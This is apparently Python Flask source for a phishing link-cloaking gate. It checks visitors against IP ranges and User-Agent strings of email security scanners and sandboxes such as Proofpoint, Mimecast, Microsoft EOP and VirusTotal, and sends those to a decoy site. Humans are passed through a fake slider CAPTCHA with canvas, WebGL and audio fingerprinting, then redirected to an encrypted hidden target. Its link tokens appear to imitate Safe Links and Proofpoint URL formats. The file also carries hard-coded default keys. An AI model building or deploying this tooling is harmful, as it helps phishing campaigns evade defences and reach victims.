import os
import time
import json
import hmac
import hashlib
import secrets
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import quote

import httpx
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import (
    Flask, request, redirect, render_template_string,
    make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
AES_KEY_HEX = os.environ.get("AES_KEY_HEX", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
AES_KEY = bytes.fromhex(AES_KEY_HEX)

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.xfinity.com")

FP_RATE_LIMIT = int(os.environ.get("FP_RATE_LIMIT", "2"))
FP_RATE_WINDOW = int(os.environ.get("FP_RATE_WINDOW", "60"))

KV_URL = os.environ.get("KV_REST_API_URL", "")
KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# scanner networks & UAs
# ---------------------------------------------------------------------------
EOP = [
    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
]
PROOFPOINT = [
    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
    ip_network("62.128.218.0/23"),
    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
]
MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
YAHOO_AOL = [
    ip_network("66.163.160.0/19"), ip_network("74.6.0.0/16"),
    ip_network("98.136.0.0/14"), ip_network("98.137.0.0/16"),
    ip_network("98.138.0.0/15"), ip_network("98.139.0.0/16"),
    ip_network("98.140.0.0/14"), ip_network("108.160.160.0/20"),
    ip_network("188.125.64.0/19"), ip_network("203.84.192.0/19"),
]
VERIZON = [
    ip_network("72.52.0.0/14"), ip_network("96.16.0.0/12"), ip_network("108.6.0.0/16"),
]
SCANNER_NETS = {
    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
    "yahoo_aol": YAHOO_AOL, "verizon": VERIZON,
    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
    "cloudflare_email": [ip_network("104.30.0.0/18")],
    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
}
SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", "mimecast",
    "barracuda", "talos", "ironport", "forcepoint", "symantec", "messagelabs", "trendmicro",
    "trend micro", "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security", "avanan",
    "ironscales", "cloudmark", "agari", "valimail", "hornetsecurity", "spamhaus", "zerospam",
    "retarus", "vade", "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching", "intezer", "cape sandbox",
    "reverse.it", "filescan.io", "googlebot", "google-safety", "bingpreview", "bingbot",
    "duckduckbot", "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview", "applebot",
    "pinterestbot", "embedly", "quora link preview", "outbrain", "nuzzel", "vk share",
    "w3c_validator", "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl", "masscan", "nmap",
    "zgrab", "nuclei", "nikto", "sqlmap", "headlesschrome", "phantomjs", "puppeteer", "playwright",
    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot", "statuscake", "site24x7",
    "newrelic", "datadog synthetics", "yahoo", "aol", "verizon", "symantec", "webpulse", "bluecoat", "messagelabs",
)

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    try:
        a = ip_address(ip)
    except ValueError:
        a = None
    if a is not None:
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip"
                return out
    if not out["scanner"]:
        for tok in SCANNER_UA_TOKENS:
            if tok in low:
                out["scanner"] = True
                out["source"] = tok
                out["method"] = "ua"
                return out
    return out

def unseal_payload(blob):
    if not blob.startswith("u001."): return None
    try:
        core = blob[5:].replace("-3D-3D", "")
        clean = core.replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        parts = clean.split(".", 1)
        if len(parts) < 2:
            return None
        b64_ciphertext = parts[1]
        padding = '=' * (-len(b64_ciphertext) % 4)
        raw_bytes = base64.urlsafe_b64decode(b64_ciphertext + padding)
        nonce = raw_bytes[:12]
        ciphertext = raw_bytes[12:]
        aesgcm = AESGCM(AES_KEY)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return json.loads(plaintext.decode('utf-8'))
    except Exception as e:
        log.error(f"Failed to decrypt payload: {e}")
        return None

def fp_rate_limit(fp_hash: str) -> bool:
    if not KV_URL or not KV_TOKEN or not fp_hash:
        return False
    key = f"fp:{fp_hash}"
    try:
        with httpx.Client(timeout=3.0) as c:
            r = c.post(
                f"{KV_URL}/incr/{key}",
                headers={"Authorization": f"Bearer {KV_TOKEN}"},
                params={"EX": str(FP_RATE_WINDOW)},
            )
            r.raise_for_status()
            count = int(r.json().get("result") or 0)
            log.info(json.dumps({"event": "fp_rate", "fp": fp_hash[:16], "n": count}))
            return count > FP_RATE_LIMIT
    except Exception as e:
        log.error(json.dumps({"event": "fp_rate_failed", "err": str(e)}))
        return False

def _static_page(title: str, text: str, status_code: int):
    html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
    return make_response(html, status_code)

# --- NEW: Redirect with 200 OK ---
def _meta_redirect(url: str):
    """Returns a 200 OK response with an HTML meta refresh to the target URL."""
    html = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="refresh" content="0; url={url}">
        <title>Redirecting...</title>
    </head>
    <body>
        <script>window.location.href = "{url}";</script>
        <p>Redirecting to <a href="{url}">{url}</a></p>
    </body>
    </html>"""
    resp = make_response(html, 200)
    return resp

# ---------------------------------------------------------------------------
# LANDING PAGE
# ---------------------------------------------------------------------------
LANDING = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f4f8; color: #1a202c; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05), 0 10px 15px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 400px; box-sizing: border-box; }
        h1 { font-size: 22px; margin-top: 0; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 14px; color: #718096; margin-bottom: 30px; }
        .slider-container { position: relative; width: 100%; height: 50px; background-color: #edf2f7; border-radius: 25px; display: flex; align-items: center; user-select: none; overflow: hidden; }
        .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; color: #a0aec0; pointer-events: none; transition: opacity 0.3s; }
        .slider-handle { position: absolute; left: 5px; width: 40px; height: 40px; background-color: #ffffff; border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.2); display: flex; align-items: center; justify-content: center; cursor: grab; transition: transform 0.1s; }
        .slider-handle:active { cursor: grabbing; }
        .slider-handle svg { width: 16px; height: 16px; fill: #a0aec0; }
        .slider-progress { position: absolute; left: 0; top: 0; height: 100%; background-color: #c6f6d5; width: 0%; border-radius: 25px; }
        .success-text { display: none; color: #48bb78; font-weight: bold; text-align: center; width: 100%; position: absolute; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Human verification</h1>
        <p>Prove you're not a bot by sliding the handle.</p>
        <div class="slider-container" id="slider-container">
            <div class="slider-progress" id="slider-progress"></div>
            <span class="slider-text" id="slider-text">Drag to complete</span>
            <span class="success-text" id="success-text">Verified</span>
            <div class="slider-handle" id="slider-handle">
                <svg viewBox="0 0 24 24"><path d="M9 18l6-6-6-6v12z"/></svg>
            </div>
        </div>
        <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
            <input type="hidden" name="n" value="{{ nonce }}">
            <input type="hidden" name="t" value="{{ token }}">
            <input type="hidden" name="challenge" value="{{ challenge }}">
            <input type="hidden" name="pow_nonce" id="pow_nonce" value="">
            <input type="hidden" name="drag_time" id="drag_time" value="0">
            <input type="hidden" name="drag_events" id="drag_events" value="0">
            <input type="hidden" name="mouse_coords" id="mouse_coords" value="[]">
        </form>
    </div>
    <script>
        const container = document.getElementById('slider-container');
        const handle = document.getElementById('slider-handle');
        const progress = document.getElementById('slider-progress');
        const text = document.getElementById('slider-text');
        const successText = document.getElementById('success-text');
        const form = document.getElementById('challenge-form');

        let isDragging = false; let startX = 0; let maxDelta = 0;
        let dragStartTime = 0; let dragEvents = 0; let coordinates = [];

        function init() { maxDelta = container.offsetWidth - handle.offsetWidth - 10; }
        window.onload = () => { init(); bindFingerprint(); };
        window.onresize = init;

        handle.addEventListener('mousedown', startDrag);
        handle.addEventListener('touchstart', startDrag, {passive: true});
        document.addEventListener('mousemove', onDrag);
        document.addEventListener('touchmove', onDrag, {passive: false});
        document.addEventListener('mouseup', endDrag);
        document.addEventListener('touchend', endDrag);

        async function computeFingerprint() {
            const parts = [];
            parts.push(screen.width + "x" + screen.height + "x" + screen.colorDepth);
            parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
            parts.push(navigator.hardwareConcurrency || 0);
            parts.push(navigator.platform || "");
            parts.push(Array.from(navigator.languages || []).join(","));

            try {
                const canvas = document.createElement("canvas");
                canvas.width = 200; canvas.height = 40;
                const ctx = canvas.getContext("2d");
                ctx.textBaseline = "top";
                ctx.font = "16px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillRect(0, 0, 100, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("fingerprint-αβγ-123", 2, 15);
                parts.push(canvas.toDataURL().slice(-64));
            } catch (e) {}

            try {
                const gl = document.createElement("canvas").getContext("webgl");
                const dbg = gl.getExtension("WEBGL_debug_renderer_info");
                if (dbg) {
                    parts.push(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + "|" + gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
                }
            } catch (e) {}

            try {
                const ctx = new OfflineAudioContext(1, 44100, 44100);
                const osc = ctx.createOscillator();
                osc.type = "triangle";
                osc.frequency.value = 1000;
                osc.connect(ctx.destination);
                osc.start(0);
                const buf = await ctx.startRendering();
                let sum = 0;
                for (let i = 0; i < buf.length; i += 100) sum += Math.abs(buf.getChannelData(0)[i]);
                parts.push(Math.round(sum).toString());
            } catch (e) {}

            const raw = parts.join("||");
            const hashBuf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
            return Array.from(new Uint8Array(hashBuf)).map(b => b.toString(16).padStart(2, "0")).join("");
        }

        async function bindFingerprint() {
            const fp = await computeFingerprint();
            try {
                await fetch("/fingerprint", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    credentials: "same-origin",
                    body: JSON.stringify({ fp: fp })
                });
            } catch (e) { console.error(e); }
        }

        function startDrag(e) {
            isDragging = true; dragStartTime = Date.now(); dragEvents = 0; coordinates = [];
            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
        }

        function onDrag(e) {
            if (!isDragging) return;
            if (e.cancelable) e.preventDefault();
            dragEvents++;
            const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
            const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
            coordinates.push({x: clientX, y: clientY});
            let deltaX = clientX - startX;
            if (deltaX < 0) deltaX = 0; if (deltaX > maxDelta) deltaX = maxDelta;
            handle.style.left = (5 + deltaX) + 'px';
            progress.style.width = ((deltaX + 40) / container.offsetWidth * 100) + '%';
            if (deltaX >= maxDelta - 2) { completeVerification(); }
        }

        function endDrag() {
            if (!isDragging) return; isDragging = false;
            if (parseInt(handle.style.left) < maxDelta) {
                handle.style.transition = 'left 0.3s ease'; progress.style.transition = 'width 0.3s ease';
                handle.style.left = '5px'; progress.style.width = '0%';
                setTimeout(() => { handle.style.transition = ''; progress.style.transition = ''; }, 300);
            }
        }

        async function completeVerification() {
            isDragging = false;
            const dragDuration = Date.now() - dragStartTime;
            if (dragDuration < 200 || dragEvents < 5) {
                document.getElementById("slider-text").innerText = "Automation detected. Try again.";
                handle.style.left = '5px'; progress.style.width = '0%';
                return;
            }

            handle.style.background = '#48bb78';
            handle.innerHTML = '<svg style="fill:white" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
            handle.style.cursor = 'default'; text.style.opacity = '0'; successText.style.display = 'block';

            const seed = "{{ challenge }}";
            let nonce = 0; let hash = "";
            while (!hash.startsWith("0000")) {
                nonce++;
                const data = new TextEncoder().encode(seed + nonce);
                const hashBuffer = await crypto.subtle.digest("SHA-256", data);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            }

            document.getElementById("pow_nonce").value = nonce;
            document.getElementById("drag_time").value = dragDuration;
            document.getElementById("drag_events").value = dragEvents;
            document.getElementById("mouse_coords").value = JSON.stringify(coordinates);

            form.submit();
        }
    </script>
</body>
</html>"""

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)

@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
    eop_token = token.replace("click_upn=", "")
    data = unseal_payload(eop_token)
    if not data or "target" not in data:
        return _static_page("Invalid link", "Could not decrypt target.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    log.info(json.dumps({"event": "landing_get", **tag}))
    
    # If it's a scanner, send to unwanted URL with a 302
    if tag["scanner"]:
        unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
        log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
        return redirect(unwanted, code=302)

    challenge_seed = secrets.token_hex(16)
    nonce_payload = {"t": eop_token, "ts": time.time(), "challenge": challenge_seed, "fp": ""}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(
        LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token,
        nonce=nonce_blob, challenge=challenge_seed,
    )
    resp = make_response(html)
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    return resp

@app.route("/fingerprint", methods=["POST"])
def bind_fingerprint():
    cookie_val = request.cookies.get("gate_session", "")
    if not cookie_val:
        return jsonify({"error": "no session"}), 401
    try:
        nonce_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
    except Exception:
        return jsonify({"error": "invalid session"}), 401

    body = request.get_json(silent=True) or {}
    fp_hash = (body.get("fp") or "").strip()
    if not fp_hash or len(fp_hash) != 64:
        return jsonify({"error": "bad fp"}), 400

    nonce_data["fp"] = fp_hash
    new_blob = cookie_serializer.dumps(nonce_data)

    resp = jsonify({"ok": True})
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", new_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    # For ANY verification failure below, we use _meta_redirect to send a 200 OK
    # with a meta refresh, instead of a 400 Bad Request.
    unwanted = UNWANTED_REDIRECT_URL
    
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    if tag["scanner"]:
        return _meta_redirect(unwanted)

    cookie_val = request.cookies.get("gate_session", "")
    if not cookie_val:
        return _meta_redirect(unwanted)

    try:
        nonce_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
    except Exception:
        return _meta_redirect(unwanted)

    if not hmac.compare_digest(nonce_data.get("t", ""), token):
        return _meta_redirect(unwanted)

    cookie_fp = nonce_data.get("fp", "")
    if not cookie_fp:
        return _meta_redirect(unwanted)

    # PoW
    submitted_pow = request.form.get("pow_nonce", "")
    seed = nonce_data.get("challenge", "")
    if not seed or not submitted_pow:
        return _meta_redirect(unwanted)
        
    test_hash = hashlib.sha256((seed + submitted_pow).encode()).hexdigest()
    if not test_hash.startswith("0000"):
        return _meta_redirect(unwanted)

    # Telemetry
    drag_time = int(request.form.get("drag_time", 0))
    drag_events = int(request.form.get("drag_events", 0))
    coords_json = request.form.get("mouse_coords", "[]")
    
    if drag_time < 200 or drag_events < 5:
        return _meta_redirect(unwanted)
        
    try:
        coords = json.loads(coords_json)
        if len(coords) > 1:
            y_values = [c["y"] for c in coords]
            mean_y = sum(y_values) / len(y_values)
            variance_y = sum((y - mean_y) ** 2 for y in y_values) / len(y_values)
            if variance_y == 0:
                return _meta_redirect(unwanted)
        else:
            return _meta_redirect(unwanted)
    except Exception:
        return _meta_redirect(unwanted)

    # Fingerprint rate limit
    if fp_rate_limit(cookie_fp):
        log.info(json.dumps({"event": "fp_rate_blocked", "fp": cookie_fp[:16]}))
        return _meta_redirect(unwanted)

    # All checks pass → decrypt target and redirect the real user
    data = unseal_payload(token)
    if not data or "target" not in data:
        return _meta_redirect(unwanted)

    # Real target redirect (normal 303)
    resp = make_response(redirect(data["target"], code=303))
    resp.delete_cookie("gate_session", path="/")
    return resp

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
